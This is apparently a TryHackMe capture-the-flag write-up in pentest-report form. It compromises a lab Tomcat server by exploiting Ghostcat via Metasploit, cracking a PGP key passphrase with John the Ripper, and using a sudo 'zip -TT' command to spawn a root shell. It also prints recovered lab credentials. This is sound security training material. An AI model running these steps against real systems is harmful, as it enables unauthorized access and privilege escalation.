
## A THM Room

### By Sovren


## Executive Summary

This penetration test assessed the security posture of a Linux-based server hosting an **Apache Tomcat web application**. The objective was to identify vulnerabilities that could allow an attacker to gain unauthorized access to the system and escalate privileges.

During the assessment, several exposed services were identified, including **SSH (22), Apache Tomcat (8080), and the Apache JServ Protocol (AJP) service on port 8009**. The AJP service was externally accessible and vulnerable to the **Ghostcat vulnerability (CVE-2020-1938)**, which allowed the retrieval of sensitive information from the server. Exploiting this misconfiguration enabled the discovery of credentials that provided initial access to the system.

Further enumeration revealed encrypted credential files within a user’s home directory. The associated **PGP key was protected by a weak passphrase**, which was successfully cracked using a dictionary attack. This allowed the recovery of additional credentials and facilitated lateral movement to another user account.

Privilege escalation was ultimately achieved due to a **misconfigured sudo permission**, which allowed the user to execute the `zip` binary with root privileges without authentication. By abusing this permission, a root shell was obtained and full administrative access to the system was achieved.

The compromise demonstrates how multiple moderate weaknesses—service misconfiguration, weak cryptographic passphrases, and overly permissive sudo rules—can be chained together to achieve complete system compromise.

To mitigate these risks, it is recommended that the organization restrict access to internal services such as AJP, ensure all software is fully patched, enforce strong credential and key passphrase policies, and regularly audit sudo permissions and system configurations.

Overall, the vulnerabilities identified during this assessment allowed an attacker to progress from external reconnaissance to full root access, highlighting the need for improved configuration management and security hardening.

# Reconnaissance 

Initial reconnaissance was performed using Nmap to identify open ports, services, and potential attack vectors on the target host.

Key observations:

- **Port 22 (SSH)** – Remote login service available.
    
- **Port 8080 (HTTP)** – Apache Tomcat web server hosting the application.
    
- **Port 8009 (AJP13)** – Apache JServ Protocol exposed, which is typically intended for internal communication between web servers and application servers.
    
- **Port 53** – Appears filtered or wrapped.
    

The exposure of the AJP service is notable because it is normally not meant to be accessible externally and may allow file inclusion or other exploitation.
### Nmap

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Device type: general purpose|media device|phone
Running (JUST GUESSING): Linux 3.X|5.X|4.X (96%), Amazon embedded (92%), Google Android 5.X|6.X|7.X|9.X (92%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:4.4 cpe:/o:google:android:5.0 cpe:/o:google:android:6 cpe:/o:google:android:7 cpe:/o:google:android:9 cpe:/o:linux:linux_kernel:4
Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.10 - 3.13 (96%), Linux 5.4 (96%), Linux 3.13 (95%), Linux 4.4 (95%), Amazon Fire TV (92%), Sony Android TV (Android 5.0) (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%), Android 7.1.1 - 7.1.2 (92%), Android 8 (Linux 3.10) (92%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/11%OT=22%CT=1%CU=35334%PV=Y%DS=3%DC=I%G=Y%TM=69B1B62
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=105%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%
OS:CI=I%II=I%TS=8)SEQ(SP=FC%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ(SP=FD%GCD
OS:=1%ISR=103%TI=Z%CI=I%II=I%TS=8)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8
OS:NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=68DF%W2=68DF%W
OS:3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW7%CC=
OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```


# Enumeration

Directory enumeration was conducted for thoroughness, but nothing substantial was gained.

```
docs                 (Status: 302) [Size: 0] [--> /docs/]
examples             (Status: 302) [Size: 0] [--> /examples/]
favicon.ico          (Status: 200) [Size: 21630]
manager              (Status: 302) [Size: 0] [--> /manager/]
```


# Exploitation
## Apache Jserv

The exposed AJP13 service on port 8009 is vulnerable to the **Ghostcat vulnerability (CVE-2020-1938)** in certain Apache Tomcat configurations.

Ghostcat allows attackers to retrieve sensitive files from the server and potentially obtain credentials.

The vulnerability was tested using the Metasploit module:

`auxiliary/admin/http/tomcat_ghostcat`

The exploit successfully retrieved sensitive information from the server, including credentials required to access the system.

<img width="628" height="499" alt="ghostcat1" src="https://github.com/user-attachments/assets/3f6b7d75-a635-4323-b3ab-1a13ff3054e1" />


# Post-Exploitation

After gaining access to the system, user enumeration revealed multiple accounts including **merlin** and **skyfuck**.
The first flag can be found in /home/merlin/user.txt without any further escalation.

Within the `/home/skyfuck` directory, the following files were discovered:
```
credential.pgp
tryhackme.asc
```

The presence of these files suggested **encrypted credentials** protected by a **PGP key**. 
An attempt to decrypt the file failed because the secret key was protected by a passphrase. 

## PGP Key Cracking

The key was copied to the attacking machine and converted to a hash suitable for password cracking.

```
gpg2john key.asc > pgp.hash
```

The hash was then cracked using **John the Ripper** with the **rockyou** wordlist.

```
john --wordlist=/usr/share/wordlists/rockyou.txt pgp.hash
```

The recovered passphrase was:

`alexandru`

Using this passphrase allowed successful decryption of the credentials.

### Decrypted Credentials

`merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

These credentials were used to switch to the **merlin** user.

This resulted in successful **lateral movement**.

# Privilege Escalation 

Privilege escalation checks were performed using:
`sudo -l` 
```
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

`find / -perm -4000 2>/dev/null`
```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/bin/mount
/bin/ping
/bin/umount
/bin/fusermount
/bin/su
/bin/ping6
```

### Exploiting Sudo Misconfiguration:
The `zip` utility can execute arbitrary commands through the `-TT` test option, allowing privilege escalation.
```
cd /tmp

echo "" > test

sudo zip /tmp/test /etc/hosts -T -TT '/bin/sh #'
```
This command spawns a root shell, resulting in full system compromise.

After successful privilege escalation, the root flag was obtained from:

```
/root/root.txt
```


# Key Findings

| Vulnerability                          | Impact                                            |
| -------------------------------------- | ------------------------------------------------- |
| Exposed AJP service (Ghostcat)         | Sensitive file disclosure and credential leakage  |
| Weak PGP passphrase                    | Credentials recoverable through dictionary attack |
| Sudo misconfiguration (`zip` NOPASSWD) | Full privilege escalation to root                 |

# Recommendations

1. Disable external access to AJP (port 8009) unless explicitly required.
    
2. Upgrade Apache Tomcat to a version patched against Ghostcat.
    
3. Enforce strong passphrases for cryptographic keys.
    
4. Review sudo permissions and remove unnecessary NOPASSWD privileges.
    
5. Implement principle of least privilege across system accounts.
